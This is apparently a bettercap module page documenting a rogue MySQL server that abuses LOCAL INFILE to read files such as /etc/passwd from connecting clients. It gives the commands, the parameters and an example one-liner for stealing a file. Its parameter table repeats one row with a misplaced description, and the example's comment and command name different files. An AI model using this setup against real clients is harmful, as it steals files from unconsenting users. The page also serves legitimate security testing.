---
title: "mysql.server (rogue)"
date: 2019-02-25T13:25:31+01:00
draft: false
weight: 3
---

A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client.

**Commands**

| command | description |
|---------|-------------|
| `mysql.server on` | Start mysql server. |
| `mysql.server off` | Stop mysql server. |

**Parameters**

| parameter | default | description |
|-----------|---------|-------------|
| `mysql.server.infile` | `/etc/passwd` | File you want to read. UNC paths are also supported. | 
| `mysql.server.outfile` | | If filled, the INFILE buffer will be saved to this path instead of being logged. |
| `mysql.server.address` |  `<interface address>` | Address to bind the mysql server to. |
| `mysql.server.port` | `3306` | Port to bind the mysql server to. |
| `mysql.server.outfile` | If filled, the INFILE buffer will be saved to this path instead of being logged. | 

**Examples**

One liner to start the server and steal /etc/passwd from clients connecting to your Rogue MySQL server

    $ sudo bettercap -eval "set mysql.server.infile /etc/hosts; mysql.server on"

Now connect to your MySQL server and observe the file output on the Bettercap terminal

    $ mysql -u root -h 192.168.1.123 -pasdsasad --enable-local-infile

**Author**

[Bernardo Rodrigues](https://github.com/bmaia)

**Ref**

https://w00tsec.blogspot.it/2018/04/abusing-mysql-local-infile-to-read.html
